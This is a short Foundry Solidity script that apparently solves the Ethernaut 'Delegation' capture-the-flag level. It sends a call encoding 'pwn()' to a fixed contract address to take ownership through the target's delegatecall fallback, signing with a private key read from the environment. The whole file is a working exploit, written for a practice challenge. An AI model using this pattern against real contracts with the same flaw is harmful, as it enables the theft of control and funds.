// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DelegationSolution is Script {

    Delegation public delegationInstance = Delegation(0x5717A8F61955b385B6a1AE226fE1f200A8527cE8);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        bytes memory data = abi.encodeWithSignature("pwn()");

        (bool success,) = address(delegationInstance).call(data);
        require(success, "nooooo" );

        vm.stopBroadcast();
    }
}